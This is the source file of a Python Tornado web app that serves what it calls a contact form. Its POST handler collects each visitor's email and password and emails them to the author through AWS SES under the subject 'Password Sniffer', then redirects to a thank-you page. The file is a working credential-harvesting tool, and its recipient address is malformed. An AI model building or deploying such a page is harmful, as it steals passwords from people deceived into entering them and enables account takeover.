import os
import boto3

import tornado.ioloop
import tornado.web
import tornado.log

from dotenv import load_dotenv

from jinja2 import \
  Environment, PackageLoader, select_autoescape

load_dotenv('.env')

PORT = int(os.environ.get('PORT', '8888'))

ENV = Environment(
  loader=PackageLoader('myapp', 'templates'),
  autoescape=select_autoescape(['html', 'xml'])
)

SES_CLIENT = boto3.client(
  'ses',
  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
  region_name="us-east-1"
)

class TemplateHandler(tornado.web.RequestHandler):
  def render_template (self, tpl, context):
    template = ENV.get_template(tpl)
    self.write(template.render(**context))

class MainHandler(TemplateHandler):
  def get(self):
    names = self.get_query_arguments('name')
    self.set_header(
      'Cache-Control',
      'no-store, no-cache, must-revalidate, max-age=0')
    self.render_template("contact_form.html", {})

class PageHandler(TemplateHandler):
  def post (self, page):
    email = self.get_body_argument('email')
    password = self.get_body_argument('password')

    response = SES_CLIENT.send_email(
      Destination={
        'ToAddresses': ['richiewong07.com'],
      },
      Message={
        'Body': {
          'Text': {
            'Charset': 'UTF-8',
            'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
          },
        },
        'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
      },
      Source='richie@richiewong07.com',
    )
    # self.write('Thanks got your data<br>')
    # self.write('Email: ' + email)
    self.redirect('/thank-you-for-submitting')

  def get(self, page):
    self.set_header(
      'Cache-Control',
      'no-store, no-cache, must-revalidate, max-age=0')
    self.render_template(page, {})

def make_app():
  return tornado.web.Application([
    (r"/", MainHandler),
    (r"/page/(.*)", PageHandler),
    (
      r"/static/(.*)",
      tornado.web.StaticFileHandler,
      {'path': 'static'}
    ),
  ], autoreload=True)

if __name__ == "__main__":
  tornado.log.enable_pretty_logging()

  app = make_app()
  app.listen(PORT, print('Server started on localhost:' + str(PORT)))
  tornado.ioloop.IOLoop.current().start()
